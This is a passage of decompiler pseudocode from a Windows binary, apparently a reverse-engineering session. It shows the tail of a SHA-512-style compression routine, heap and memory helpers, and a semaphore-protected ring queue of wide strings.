    v11 = (HIDWORD(v41) & HIDWORD(v54) ^ HIDWORD(v41) & HIDWORD(v52) ^ HIDWORD(v54) & HIDWORD(v52))
        + ((v52 >> 7) ^ (v52 >> 2) ^ ((16 * v52) | (HIDWORD(v52) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v43);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v43)) < HIDWORD(v43)) + v29 + v43;
    v44 = v3;
    HIDWORD(v50) = v11 + *(_DWORD *)v40;
    LODWORD(v50) = (v11 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v11 < ((unsigned int)(v52 >> 7)
                         ^ (unsigned int)(v52 >> 2)
                         ^ ((16 * (_DWORD)v52) | (HIDWORD(v52) >> 28))))
                 + (v41 & v54 ^ v41 & v52 ^ v54 & v52)
                 + ((((_DWORD)v52 << 25) | (HIDWORD(v52) >> 7))
                  ^ (((_DWORD)v52 << 30) | (HIDWORD(v52) >> 2))
                  ^ (v52 >> 28))
                 + v29;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (HIDWORD(v46) & HIDWORD(v3) ^ *(_DWORD *)&v40[8] & ~HIDWORD(v3));
    v30 = (*(_DWORD *)v40 < (HIDWORD(v46) & HIDWORD(v3) ^ *(_DWORD *)&v40[8] & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v46 & v3 ^ *(_DWORD *)&v40[4] & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 3]);
    v12 = HIDWORD(v3) + HIDWORD(v68[k + 3]);
    *(_DWORD *)v40 = v12 + HIDWORD(v47);
    v31 = (v12 + HIDWORD(v47) < HIDWORD(v47))
        + (v12 < HIDWORD(v68[k + 3]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 3]))
        + v30
        + LODWORD(qword_7FF6E55A4470[k + 3])
        + LODWORD(v68[k + 3])
        + v47;
    v13 = (HIDWORD(v54) & HIDWORD(v52) ^ HIDWORD(v54) & HIDWORD(v50) ^ HIDWORD(v52) & HIDWORD(v50))
        + ((v50 >> 7) ^ (v50 >> 2) ^ ((16 * v50) | (HIDWORD(v50) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v41);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v41)) < HIDWORD(v41)) + v31 + v41;
    v42 = v3;
    HIDWORD(v48) = v13 + *(_DWORD *)v40;
    LODWORD(v48) = (v13 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v13 < ((unsigned int)(v50 >> 7)
                         ^ (unsigned int)(v50 >> 2)
                         ^ ((16 * (_DWORD)v50) | (HIDWORD(v50) >> 28))))
                 + (v54 & v52 ^ v54 & v50 ^ v52 & v50)
                 + ((((_DWORD)v50 << 25) | (HIDWORD(v50) >> 7))
                  ^ (((_DWORD)v50 << 30) | (HIDWORD(v50) >> 2))
                  ^ (v50 >> 28))
                 + v31;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (HIDWORD(v44) & HIDWORD(v3) ^ HIDWORD(v46) & ~HIDWORD(v3));
    v32 = (*(_DWORD *)v40 < (HIDWORD(v44) & HIDWORD(v3) ^ HIDWORD(v46) & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v44 & v3 ^ v46 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 4]);
    v14 = HIDWORD(v3) + HIDWORD(v68[k + 4]);
    *(_DWORD *)v40 = v14 + *(_DWORD *)&v40[8];
    v33 = (v14 + *(_DWORD *)&v40[8] < *(_DWORD *)&v40[8])
        + (v14 < HIDWORD(v68[k + 4]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 4]))
        + v32
        + LODWORD(qword_7FF6E55A4470[k + 4])
        + LODWORD(v68[k + 4])
        + *(_DWORD *)&v40[4];
    v15 = (HIDWORD(v52) & HIDWORD(v50) ^ HIDWORD(v52) & HIDWORD(v48) ^ HIDWORD(v50) & HIDWORD(v48))
        + ((v48 >> 7) ^ (v48 >> 2) ^ ((16 * v48) | (HIDWORD(v48) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v54);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v54)) < HIDWORD(v54)) + v33 + v54;
    v53 = v3;
    *(_DWORD *)&v40[8] = v15 + *(_DWORD *)v40;
    *(_DWORD *)&v40[4] = (v15 + *(_DWORD *)v40 < *(_DWORD *)v40)
                       + (v15 < ((unsigned int)(v48 >> 7)
                               ^ (unsigned int)(v48 >> 2)
                               ^ ((16 * (_DWORD)v48) | (HIDWORD(v48) >> 28))))
                       + (v52 & v50 ^ v52 & v48 ^ v50 & v48)
                       + ((((_DWORD)v48 << 25) | (HIDWORD(v48) >> 7))
                        ^ (((_DWORD)v48 << 30) | (HIDWORD(v48) >> 2))
                        ^ (v48 >> 28))
                       + v33;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (HIDWORD(v42) & HIDWORD(v3) ^ HIDWORD(v44) & ~HIDWORD(v3));
    v34 = (*(_DWORD *)v40 < (HIDWORD(v42) & HIDWORD(v3) ^ HIDWORD(v44) & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v42 & v3 ^ v44 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 5]);
    v16 = HIDWORD(v3) + HIDWORD(v68[k + 5]);
    *(_DWORD *)v40 = v16 + HIDWORD(v46);
    v35 = (v16 + HIDWORD(v46) < HIDWORD(v46))
        + (v16 < HIDWORD(v68[k + 5]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 5]))
        + v34
        + LODWORD(qword_7FF6E55A4470[k + 5])
        + LODWORD(v68[k + 5])
        + v46;
    v17 = (HIDWORD(v50) & HIDWORD(v48) ^ HIDWORD(v50) & *(_DWORD *)&v40[8] ^ HIDWORD(v48) & *(_DWORD *)&v40[8])
        + ((*(__int64 *)&v40[4] >> 7)
         ^ (*(__int64 *)&v40[4] >> 2)
         ^ ((16 * *(_DWORD *)&v40[4]) | (*(_DWORD *)&v40[8] >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v52);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v52)) < HIDWORD(v52)) + v35 + v52;
    v51 = v3;
    HIDWORD(v45) = v17 + *(_DWORD *)v40;
    LODWORD(v45) = (v17 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v17 < ((unsigned int)(*(__int64 *)&v40[4] >> 7)
                         ^ (unsigned int)(*(__int64 *)&v40[4] >> 2)
                         ^ ((16 * *(_DWORD *)&v40[4]) | (*(_DWORD *)&v40[8] >> 28))))
                 + (v50 & v48 ^ v50 & *(_DWORD *)&v40[4] ^ v48 & *(_DWORD *)&v40[4])
                 + (((*(_DWORD *)&v40[4] << 25) | (*(_DWORD *)&v40[8] >> 7))
                  ^ ((*(_DWORD *)&v40[4] << 30) | (*(_DWORD *)&v40[8] >> 2))
                  ^ (*(__int64 *)&v40[4] >> 28))
                 + v35;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (HIDWORD(v53) & HIDWORD(v3) ^ HIDWORD(v42) & ~HIDWORD(v3));
    v36 = (*(_DWORD *)v40 < (HIDWORD(v53) & HIDWORD(v3) ^ HIDWORD(v42) & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v53 & v3 ^ v42 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 6]);
    v18 = HIDWORD(v3) + HIDWORD(v68[k + 6]);
    *(_DWORD *)v40 = v18 + HIDWORD(v44);
    v37 = (v18 + HIDWORD(v44) < HIDWORD(v44))
        + (v18 < HIDWORD(v68[k + 6]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 6]))
        + v36
        + LODWORD(qword_7FF6E55A4470[k + 6])
        + LODWORD(v68[k + 6])
        + v44;
    v19 = (HIDWORD(v48) & *(_DWORD *)&v40[8] ^ HIDWORD(v48) & HIDWORD(v45) ^ *(_DWORD *)&v40[8] & HIDWORD(v45))
        + ((v45 >> 7) ^ (v45 >> 2) ^ ((16 * v45) | (HIDWORD(v45) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v50);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v50)) < HIDWORD(v50)) + v37 + v50;
    v49 = v3;
    HIDWORD(v43) = v19 + *(_DWORD *)v40;
    LODWORD(v43) = (v19 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v19 < ((unsigned int)(v45 >> 7)
                         ^ (unsigned int)(v45 >> 2)
                         ^ ((16 * (_DWORD)v45) | (HIDWORD(v45) >> 28))))
                 + (v48 & *(_DWORD *)&v40[4] ^ v48 & v45 ^ *(_DWORD *)&v40[4] & v45)
                 + ((((_DWORD)v45 << 25) | (HIDWORD(v45) >> 7))
                  ^ (((_DWORD)v45 << 30) | (HIDWORD(v45) >> 2))
                  ^ (v45 >> 28))
                 + v37;
    *(_DWORD *)v40 = ((v3 >> 9) ^ (((_DWORD)v3 << 14) | (HIDWORD(v3) >> 18))
                                ^ (((_DWORD)v3 << 18) | (HIDWORD(v3) >> 14)))
                   + (HIDWORD(v51) & HIDWORD(v3) ^ HIDWORD(v53) & ~HIDWORD(v3));
    v38 = (*(_DWORD *)v40 < (HIDWORD(v51) & HIDWORD(v3) ^ HIDWORD(v53) & (unsigned int)~HIDWORD(v3)))
        + ((((_DWORD)v3 << 23) | (HIDWORD(v3) >> 9)) ^ (v3 >> 18) ^ (v3 >> 14))
        + (v51 & v3 ^ v53 & ~(_DWORD)v3);
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(qword_7FF6E55A4470[k + 7]);
    v20 = HIDWORD(v3) + HIDWORD(v68[k + 7]);
    *(_DWORD *)v40 = v20 + HIDWORD(v42);
    v39 = (v20 + HIDWORD(v42) < HIDWORD(v42))
        + (v20 < HIDWORD(v68[k + 7]))
        + (HIDWORD(v3) < HIDWORD(qword_7FF6E55A4470[k + 7]))
        + v38
        + LODWORD(qword_7FF6E55A4470[k + 7])
        + LODWORD(v68[k + 7])
        + v42;
    v21 = (*(_DWORD *)&v40[8] & HIDWORD(v45) ^ *(_DWORD *)&v40[8] & HIDWORD(v43) ^ HIDWORD(v45) & HIDWORD(v43))
        + ((v43 >> 7) ^ (v43 >> 2) ^ ((16 * v43) | (HIDWORD(v43) >> 28)));
    HIDWORD(v3) = *(_DWORD *)v40 + HIDWORD(v48);
    LODWORD(v3) = ((unsigned int)(*(_DWORD *)v40 + HIDWORD(v48)) < HIDWORD(v48)) + v39 + v48;
    v47 = v3;
    HIDWORD(v41) = v21 + *(_DWORD *)v40;
    LODWORD(v41) = (v21 + *(_DWORD *)v40 < *(_DWORD *)v40)
                 + (v21 < ((unsigned int)(v43 >> 7)
                         ^ (unsigned int)(v43 >> 2)
                         ^ ((16 * (_DWORD)v43) | (HIDWORD(v43) >> 28))))
                 + (*(_DWORD *)&v40[4] & v45 ^ *(_DWORD *)&v40[4] & v43 ^ v45 & v43)
                 + ((((_DWORD)v43 << 25) | (HIDWORD(v43) >> 7))
                  ^ (((_DWORD)v43 << 30) | (HIDWORD(v43) >> 2))
                  ^ (v43 >> 28))
                 + v39;
  }
  v55 = *(_QWORD *)a1;
  *(_DWORD *)(a1 + 4) = HIDWORD(*(_QWORD *)a1) + HIDWORD(v41);
  *(_DWORD *)a1 = (*(_DWORD *)(a1 + 4) < HIDWORD(v41)) + v55 + v41;
  v56 = *(_QWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 12) = HIDWORD(v56) + HIDWORD(v43);
  *(_DWORD *)(a1 + 8) = (*(_DWORD *)(a1 + 12) < HIDWORD(v43)) + v56 + v43;
  v57 = *(_QWORD *)(a1 + 16);
  *(_DWORD *)(a1 + 20) = HIDWORD(v57) + HIDWORD(v45);
  *(_DWORD *)(a1 + 16) = (*(_DWORD *)(a1 + 20) < HIDWORD(v45)) + v57 + v45;
  v58 = *(_QWORD *)(a1 + 24);
  *(_DWORD *)(a1 + 28) = HIDWORD(v58) + *(_DWORD *)&v40[8];
  *(_DWORD *)(a1 + 24) = (*(_DWORD *)(a1 + 28) < *(_DWORD *)&v40[8]) + v58 + *(_DWORD *)&v40[4];
  v59 = *(_QWORD *)(a1 + 32);
  *(_DWORD *)(a1 + 36) = HIDWORD(v59) + HIDWORD(v47);
  *(_DWORD *)(a1 + 32) = (*(_DWORD *)(a1 + 36) < HIDWORD(v47)) + v59 + v47;
  v60 = *(_QWORD *)(a1 + 40);
  *(_DWORD *)(a1 + 44) = HIDWORD(v60) + HIDWORD(v49);
  *(_DWORD *)(a1 + 40) = (*(_DWORD *)(a1 + 44) < HIDWORD(v49)) + v60 + v49;
  v61 = *(_QWORD *)(a1 + 48);
  *(_DWORD *)(a1 + 52) = HIDWORD(v61) + HIDWORD(v51);
  *(_DWORD *)(a1 + 48) = (*(_DWORD *)(a1 + 52) < HIDWORD(v51)) + v61 + v51;
  v62 = *(_QWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 60) = HIDWORD(v62) + HIDWORD(v53);
  result = (unsigned int)(*(_DWORD *)(a1 + 60) < HIDWORD(v53)) + (_DWORD)v62 + (_DWORD)v53;
  *(_DWORD *)(a1 + 56) = result;
  return result;
}
// 7FF6E55A4470: using guessed type __int64 qword_7FF6E55A4470[80];

//----- (00007FF6E55B77C0) ----------------------------------------------------
HANDLE fn_call_GetProcessHeap()
{
  HANDLE result; // rax

  result = GetProcessHeap();
  hHeap = result;
  return result;
}

//----- (00007FF6E55B77E0) ----------------------------------------------------
unsigned __int64 __fastcall fn_memset(__int64 a1, char a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+0h] [rbp-18h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(a1 + i) = a2;
  }
  return result;
}

//----- (00007FF6E55B7830) ----------------------------------------------------
unsigned __int64 __fastcall sub_7FF6E55B7830(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+0h] [rbp-18h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(a1 + i) = *(_BYTE *)(a2 + i);
  }
  return result;
}

//----- (00007FF6E55B7890) ----------------------------------------------------
LPVOID __fastcall sub_140017890(__int64 a1)
{
  LPVOID v2; // [rsp+20h] [rbp-18h]

  do
    v2 = HeapAlloc(hHeap, 8u, a1 + 64);
  while ( !v2 );
  return v2;
}

//----- (00007FF6E55B78E0) ----------------------------------------------------
BOOL __fastcall sub_1400178E0(void *a1)
{
  return HeapFree(hHeap, 0, a1);
}

//----- (00007FF6E55B7910) ----------------------------------------------------
void __fastcall fn_work_queue_init(__int64 a1, LONG a2)
{
  *(_DWORD *)(a1 + 56) = a2;
  *(_QWORD *)(a1 + 64) = fn_call_HeapAlloc(8LL * a2);
  *(_QWORD *)a1 = CreateSemaphoreA(0, a2, a2, 0);
  *(_QWORD *)(a1 + 8) = CreateSemaphoreA(0, 0, a2, 0);
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
}

//----- (00007FF6E55B79B0) ----------------------------------------------------
__int64 __fastcall fn_ring_queue_dequeue_wstr(__int64 a1, int a2, _DWORD *a3)
{
  __int64 v4; // [rsp+20h] [rbp-18h]

  *a3 = 0;
  if ( WaitForSingleObject(*(HANDLE *)(a1 + 8), 0) )
  {
    if ( !a2 )
    {
      *a3 = -1;
      return 0;
    }
    WaitForSingleObject(*(HANDLE *)(a1 + 8), 0xFFFFFFFF);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  v4 = *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(int *)(a1 + 76));
  *(_DWORD *)(a1 + 76) = (*(_DWORD *)(a1 + 76) + 1) % *(_DWORD *)(a1 + 56);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  ReleaseSemaphore(*(HANDLE *)a1, 1, 0);
  return v4;
}

//----- (00007FF6E55B7AA0) ----------------------------------------------------
__int64 __fastcall fn_ring_queue_enqueue_wstr(__int64 a1, const WCHAR *a2, int a3)
{
  int v4; // [rsp+20h] [rbp-18h]
  LPVOID v5; // [rsp+28h] [rbp-10h]

  if ( WaitForSingleObject(*(HANDLE *)a1, 0) )
  {
    if ( !a3 )
      return 0;
    WaitForSingleObject(*(HANDLE *)a1, 0xFFFFFFFF);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  v5 = 0;
  if ( a2 )
  {
    v4 = 2 * (lstrlenW(a2) + 1);
    v5 = fn_call_HeapAlloc(v4);
    sub_7FF6E55B7830((__int64)v5, (__int64)a2, v4);
  }
  *(_QWORD *)(*(_QWORD *)(a1 + 64) + 8LL * *(int *)(a1 + 72)) = v5;
  *(_DWORD *)(a1 + 72) = (*(_DWORD *)(a1 + 72) + 1) % *(_DWORD *)(a1 + 56);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 16));
  ReleaseSemaphore(*(HANDLE *)(a1 + 8), 1, 0);
  return 1;
}

// nfuncs=92 queued=75 decompiled=75 lumina nreq=0 worse=0 better=0
// ALL OK, 75 function(s) have been successfully decompiled
